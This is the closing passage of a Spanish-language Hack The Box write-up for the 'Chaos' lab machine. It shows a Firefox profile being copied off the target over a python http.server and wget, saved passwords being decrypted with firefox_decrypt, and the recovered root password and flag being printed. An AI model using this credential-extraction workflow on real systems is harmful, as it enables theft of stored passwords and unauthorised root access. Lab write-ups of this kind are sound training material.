+<p>Vemos cosas, asi que vamos a utilizar una heramienta llamada <code class="language-plaintext highlighter-rouge">firefox decrypt</code> que está en <a href="https://github.com/unode/firefox_decrypt">github</a> esto nos permitirá extraer las contraseñas que se encuentren almacenadas.</p>
+
+<p>Vamos primero a abrir un servidor http con python en la máquina víctima y vamos a descargar todo lo que está en ese directorio.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
+</code></pre></div></div>
+
+<p>Luego, en nuestras máquina:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget -r chaos.htb:8000
+--2023-02-17 17:37:11--  http://chaos.htb:8000/
+Resolving chaos.htb (chaos.htb)... 10.10.10.120
+Connecting to chaos.htb (chaos.htb)|10.10.10.120|:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2983 (2.9K) [text/html]
+Saving to: ‘chaos.htb:8000/index.html’
+
+chaos.htb:8000/index.html                            100%[=====================================================================================================================&gt;]   2.91K  --.-KB/s    in 0.002s  
+</code></pre></div></div>
+
+<p>Lo descargaremos todo.</p>
+
+<p>Luego, vamos a utiliar el script dandole la ruta donde están los archivos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+python3 firefox_decrypt.py ../chaos.htb:8000
+2023-02-17 17:38:57,539 - WARNING - profile.ini not found in ../chaos.htb:8000
+2023-02-17 17:38:57,539 - WARNING - Continuing and assuming '../chaos.htb:8000' is a profile location
+
+Master Password for profile ../chaos.htb:8000: 
+</code></pre></div></div>
+
+<p>Nos pide una contraseña, vamos a introducir la que sabemos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 firefox_decrypt.py ../chaos.htb:8000
+2023-02-17 17:39:35,187 - WARNING - profile.ini not found in ../chaos.htb:8000
+2023-02-17 17:39:35,188 - WARNING - Continuing and assuming '../chaos.htb:8000' is a profile location
+
+Master Password for profile ../chaos.htb:8000: 
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+</code></pre></div></div>
+<p>Y ha funcionado, tenemos un usuario y contraseña, vamos a probarlas:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ su root
+Password: 
+root@chaos:/home/ayush/.mozilla/firefox/bzo7sjt1.default# cd /root/
+root@chaos:~# cat root.txt
+e893768eae0135bb85dfeb75
+
+</code></pre></div></div>
+
+<p>¡Listo!, nos convertimos en root, hemos terminado la máquina.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#extracting-credentials-from-browser" class="page__taxonomy-item" rel="tag">Extracting Credentials from browser</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#fuzzing" class="page__taxonomy-item" rel="tag">Fuzzing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#mail-abusing" class="page__taxonomy-item" rel="tag">Mail abusing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#restricted-bash-bypass" class="page__taxonomy-item" rel="tag">Restricted bash bypass</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#weak-password" class="page__taxonomy-item" rel="tag">Weak password</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-17T00:00:00-05:00">February 17, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/GoodGames/" class="pagination--pager" title="GoodGames HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/DarkHole_1/" class="pagination--pager" title="Dark hole 1 VulnHub Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
